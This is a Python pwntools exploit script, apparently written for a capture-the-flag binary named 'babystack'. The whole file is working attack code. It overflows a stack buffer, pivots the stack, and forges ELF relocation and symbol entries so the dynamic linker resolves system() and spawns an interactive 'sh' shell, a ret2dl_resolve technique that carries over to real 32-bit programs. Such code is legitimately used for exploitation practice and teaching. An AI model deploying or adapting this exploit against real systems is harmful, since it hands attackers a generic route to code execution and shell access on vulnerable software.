#!/usr/bin/python 
from pwn import *

s = process("./babystack")
elf = ELF("./babystack")

leave_ret = 0x8048455
STRTAB, SYMTAB, JMPREL = map(elf.dynamic_value_by_tag, ["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])
#print (hex(SYMTAB), hex(STRTAB), hex(JMPREL))

log.info("SYMTAB: {}".format(hex(SYMTAB)))
log.info("STRTAB : {}".format(hex(STRTAB))) 
log.info("JMPREL: {}".format(hex(JMPREL)))

forged_area = 0x804aa00+0x14            # for some reasons 0x804aa00 doesn't work
rop_addr = forged_area-0x14 
dl_resolve = 0x80482f0
rel_offset = forged_area - JMPREL

elf32_sym = forged_area + 0x8           # first 8-bytes belong to elf32_rel 
align_offset = 0x10 - ( (elf32_sym - SYMTAB) % 0x10 )
elf32_sym += align_offset               # because each SYMTAB entry is 0x10 bytes 

index_sym = (elf32_sym-SYMTAB) / 0x10 # index of our fake entry in SYMTAB 
r_info = (index_sym << 8) | 0x7         # formula

elf32_rel = p32(elf.got["read"]) + p32(r_info)      # each entry in JMPREL table has 2 values: 1 is the got_entry for the function (in our case it doesn't matter) and 2 is the r_info to calculate the entry offset in SYMTAB 

log.info("Forged area: {}".format(hex(forged_area)))
"""
SYMTAB:
typedef struct 
{ 
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */ 
   Elf32_Word st_size ; /* Symbol size */ 
   unsigned char st_info ; /* Symbol type and binding */ 
   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */ 
   Elf32_Section st_shndx ; /* Section index */ 
} Elf32_Sym ;
"""

st_name = (elf32_sym + 0x10) - STRTAB       # place the string "system" righr after our fake elf32_sym chunk
elf32_sym_chunk = p32(st_name) + p32(0x0) + p32(0x0) + p32(0x12)



payload = "A"*0x28
payload += p32(rop_addr)            # ebp
payload += p32(elf.plt["read"])
payload += p32(leave_ret)
payload += p32(0x0)
payload += p32(rop_addr)            # before forged area we store the values for our leave_ret as leave is mov ebp, esp; pop ebp => esp is now forged_area-0x14 as provided to ebp above.
payload += p32(0x80)

fake_chunks = "AAAA"                        # forged_area - 0x14 
fake_chunks += p32(dl_resolve)
fake_chunks += p32(rel_offset)
fake_chunks += "AAAA"                       # return address after resolving 
fake_chunks += p32(forged_area + 80)          # address of "sh" parameter for system 
fake_chunks += elf32_rel                    # forged_area + 0x0
fake_chunks += "A"*align_offset     
fake_chunks += elf32_sym_chunk
fake_chunks += "system\x00"
x = 100 - len(fake_chunks) 
fake_chunks += "B"*x
fake_chunks += "sh\x00"
fake_chunks += "C"*(0x80 - len(fake_chunks))

with open ("payload.txt", "w") as f:
    f.write(payload + fake_chunks)
s.sendline(payload + fake_chunks)
s.interactive()
